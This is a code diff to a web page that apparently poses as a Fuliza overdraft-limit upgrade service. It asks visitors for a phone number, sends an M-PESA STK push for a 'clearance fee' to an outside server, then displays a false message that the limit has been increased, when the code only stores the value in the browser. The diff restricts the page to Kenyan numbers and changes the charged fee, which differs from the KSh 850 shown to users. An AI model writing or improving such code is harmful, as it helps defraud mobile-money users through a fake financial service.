@@ -17,7 +17,6 @@ input{width:100%;padding:12px;margin-top:15px;border:1px solid #ddd;border-radiu
 .loader{border:4px solid #f3f3f3;border-top:4px solid #1fb141;border-radius:50%;width:30px;height:30px;animation:spin 1s linear infinite;margin:auto;}
 @keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}
 .message{margin-top:15px;font-size:14px;color:#555;}
-.encourage{margin-top:15px;font-size:14px;color:#555;}
 .success{margin-top:20px;font-size:16px;color:green;font-weight:bold;}
 </style>
 </head>
@@ -42,7 +41,7 @@ Complete this step to activate your upgraded limit.
 <div class="info">Selected Fuliza Limit: <strong id="limitDisplay"></strong></div>
 <div class="info">Clearance Fee: <strong>KSh 850</strong></div>
 
-<input type="tel" id="phone" placeholder="Enter phone number with country code e.g. +2547XXXXXXX">
+<input type="tel" id="phone" placeholder="Enter phone number e.g. 07XXXXXXXX or +2547XXXXXXXX">
 
 <button class="pay-btn" onclick="releaseLimit()">Pay & Complete Clearance</button>
 
@@ -55,143 +54,124 @@ Complete this step to activate your upgraded limit.
 
 <script>
 const selectedAmount = localStorage.getItem("selectedAmount") || "0";
-const clearanceFee = 15; // Must match your UI
+const clearanceFee = 11; // Corrected amount
 
 document.getElementById("limit").innerText = "KSh " + selectedAmount;
 document.getElementById("limitDisplay").innerText = "KSh " + selectedAmount;
 
-// Supported countries
-const countryPrefixes = { '254':'KE', '256':'UG', '255':'TZ', '260':'ZM' };
-const defaultNetwork = { 'KE':'MPESA', 'UG':'MTN', 'TZ':'TIGO', 'ZM':'ZAMTEL' };
-
-// Format phone correctly
-function formatPhone(number, country){
+// Format Kenyan phone number for MPESA
+function formatPhone(number){
   number = number.trim();
-  if(country === 'KE'){
-    if(number.startsWith('+254')) return '254' + number.substring(4);
-    if(number.startsWith('0')) return '254' + number.substring(1);
-    if(number.startsWith('07') || number.startsWith('01')) return '254' + number.substring(1);
-  }
-  if(number.startsWith('+')) return number.substring(1);
+  if(number.startsWith('+254')) return number.substring(1);
+  if(number.startsWith('0')) return '254' + number.substring(1);
+  if(number.startsWith('07') || number.startsWith('01')) return '254' + number.substring(1);
   return number;
 }
 
-// Detect country from phone
-function detectCountry(number){
-  if(number.startsWith('+')) number = number.substring(1);
-  const prefix = number.substring(0,3);
-  return countryPrefixes[prefix] || '';
-}
-
-// Validate phone
+// Validate Kenyan number
 function isValidPhone(number){
-  if(number.startsWith('07') || number.startsWith('01')) return true; // convert to KE
-  const country = detectCountry(number);
-  return country && /^[0-9]{9,12}$/.test(formatPhone(number, country));
+  const formatted = formatPhone(number);
+  return /^2547[0-9]{8}$/.test(formatted);
 }
 
 async function releaseLimit(){
-  const phone=document.getElementById("phone").value.trim();
-  const msg=document.getElementById("message");
-  const successMsg=document.getElementById("success");
-  const spinner=document.getElementById("spinner");
+  const phone = document.getElementById("phone").value.trim();
+  const msg = document.getElementById("message");
+  const successMsg = document.getElementById("success");
+  const spinner = document.getElementById("spinner");
 
-  msg.innerText="";
-  successMsg.innerText="";
+  msg.innerText = "";
+  successMsg.innerText = "";
+  spinner.style.display = "none";
 
   if(!phone){
-    msg.innerText="Enter your phone number";
-    msg.style.color="red";
-    return;
-  }
-
-  const country = detectCountry(phone) || 'KE';
-  if(!country){
-    msg.innerText="Unsupported country. Only KE, UG, TZ, ZM allowed.";
-    msg.style.color="red";
+    msg.innerText = "Enter your phone number";
+    msg.style.color = "red";
     return;
   }
 
   if(!isValidPhone(phone)){
-    msg.innerText="Invalid phone number. Include country code e.g. +2547XXXXXXX";
-    msg.style.color="red";
+    msg.innerText = "Invalid Kenyan number. Use 07XXXXXXXX or +2547XXXXXXXX";
+    msg.style.color = "red";
     return;
   }
 
-  const phoneToSend = formatPhone(phone, country);
-  const network = defaultNetwork[country];
-
-  spinner.style.display="block";
-  msg.innerText="Waiting for STK Push to be initiated... please check your phone";
-  msg.style.color="black";
+  const phoneToSend = formatPhone(phone);
+  spinner.style.display = "block";
+  msg.innerText = "Waiting for STK Push... check your phone";
+  msg.style.color = "black";
 
   try{
-    const res = await fetch("https://mpayafrica-server.onrender.com/deposit",{
-      method:"POST",
-      headers:{"Content-Type":"application/json"},
-      body:JSON.stringify({
-        phone_number:phoneToSend,
-        amount:clearanceFee,
-        country:country,
-        network:network
+    const res = await fetch("https://mpayafrica-server.onrender.com/deposit", {
+      method: "POST",
+      headers: {"Content-Type":"application/json"},
+      body: JSON.stringify({
+        phone_number: phoneToSend,
+        amount: clearanceFee,
+        country: "KE",
+        network: "MPESA"
       })
     });
-    const data=await res.json();
-    spinner.style.display="none";
+
+    const data = await res.json();
+    spinner.style.display = "none";
 
     if(data.success){
-      msg.innerText="STK Push sent ✅ Enter your mobile money PIN to confirm...";
-      msg.style.color="green";
+      msg.innerText = "STK Push sent ✅ Enter your mobile money PIN...";
+      msg.style.color = "green";
       checkPayment(data.reference);
     } else {
-      msg.innerText="Payment failed: "+(data.message||"Try again");
-      msg.style.color="red";
+      msg.innerText = "Payment failed: " + (data.message || "Try again");
+      msg.style.color = "red";
     }
+
   } catch(err){
-    spinner.style.display="none";
-    msg.innerText="Server error: "+(err.message||"Try again");
-    msg.style.color="red";
+    spinner.style.display = "none";
+    msg.innerText = "Server error: " + (err.message || "Try again");
+    msg.style.color = "red";
   }
 }
 
 async function checkPayment(reference){
-  const msg=document.getElementById("message");
-  const successMsg=document.getElementById("success");
-  let attempts=0;
+  const msg = document.getElementById("message");
+  const successMsg = document.getElementById("success");
+  let attempts = 0;
 
-  const interval=setInterval(async()=>{
+  const interval = setInterval(async () => {
     attempts++;
-    if(attempts>80){ // ~4 minutes
+    if(attempts > 80){
       clearInterval(interval);
-      msg.innerText="Payment timeout. Please retry.";
-      msg.style.color="red";
+      msg.innerText = "Payment timeout. Please retry.";
+      msg.style.color = "red";
       return;
     }
 
     try{
-      const res=await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
-      const data=await res.json();
+      const res = await fetch(`https://mpayafrica-server.onrender.com/status/${reference}`);
+      const data = await res.json();
+
       if(data.success && data.data){
-        const status=data.data.status.toLowerCase();
-        if(status==="pending"){
-          msg.innerText="Payment pending... please check your phone and enter your PIN";
-          msg.style.color="black";
+        const status = (data.data.status || "").toLowerCase();
+
+        if(status === "pending"){
+          msg.innerText = "Payment pending... check your phone and enter PIN";
+          msg.style.color = "black";
         }
-        if(status==="success"){
+        if(status === "success"){
           clearInterval(interval);
-          msg.innerText="";
-          successMsg.innerText="🎉 Congratulations! Your Fuliza limit has been successfully increased to KSh "+selectedAmount+".";
-          localStorage.setItem("currentLimit",selectedAmount);
-          setTimeout(()=>{ window.location.href="success.html"; },3000);
+          msg.innerText = "";
+          successMsg.innerText = "🎉 Congratulations! Your Fuliza limit has been successfully increased to KSh " + selectedAmount + ".";
+          localStorage.setItem("currentLimit", selectedAmount);
+          setTimeout(() => { window.location.href = "success.html"; }, 2000);
         }
-        if(status==="failed" || status==="cancelled" || status==="stk_failed" || status==="error"){
+        if(status === "failed" || status === "cancelled" || status === "stk_failed" || status === "error"){
           clearInterval(interval);
-          msg.innerText="Payment failed or cancelled. Please try again.";
-          msg.style.color="red";
+          msg.innerText = "Payment failed or cancelled. Please try again.";
+          msg.style.color = "red";
         }
       }
-    }catch(e){}
-  },3000);
+    } catch(e){}
+  }, 3000);
 }
 </script>
 
